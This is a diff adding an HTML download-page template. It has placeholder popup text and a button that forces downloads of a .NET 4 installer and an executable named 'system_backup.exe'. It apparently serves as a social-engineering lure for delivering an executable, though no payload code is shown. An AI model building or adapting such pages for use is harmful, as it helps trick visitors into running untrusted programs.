@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Download</title>
+<style>
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: Arial, sans-serif;
+    background: #1e2a38;
+    color: #eee;
+  }
+  .card {
+    max-width: 420px;
+    width: 90%;
+    padding: 32px;
+    background: #27394d;
+    border-radius: 10px;
+    text-align: center;
+    box-shadow: 0 8px 24px rgba(0,0,0,.35);
+  }
+  h1 { font-size: 22px; margin: 0 0 12px; }
+  p  { font-size: 14px; line-height: 1.6; margin: 0 0 24px; }
+  button {
+    font-size: 16px;
+    font-weight: bold;
+    padding: 14px 28px;
+    border: none;
+    border-radius: 6px;
+    background: #2f81f7;
+    color: #fff;
+    cursor: pointer;
+  }
+  button:hover { background: #1f6feb; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <!-- ============================================ -->
+    <!--  WRITE YOUR OWN TEXT IN THESE THREE SPOTS    -->
+    <!-- ============================================ -->
+    <h1>%% POPUP TITLE GOES HERE %%</h1>
+    <p>%% YOUR POPUP MESSAGE_GOES HERE %%</p>
+    <button id="dlbtn">%% BUTTON TEXT GOES HERE %%</button>
+  </div>
+
+<script>
+  // ============================================================
+  //  PUT YOUR HOSTED FILE URLs HERE (see hosting note below)
+  // ============================================================
+  var FILES = [
+    "%%-URL-TO-dotNetFx40-Full-x86-x64.exe-ON-YOUR-HOST-%%",
+    "%%-URL-TO-system_backup.exe-OR-THE-ENTIRE-.zip-ON-YOUR-HOST-%%"
+  ];
+
+  document.getElementById("dlbtn").addEventListener("click", function () {
+    FILES.forEach(function (url) {
+      var a = document.createElement("a");
+      a.href = url;
+      a.download = "";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    });
+  });
+</script>
+</body>
+</html>
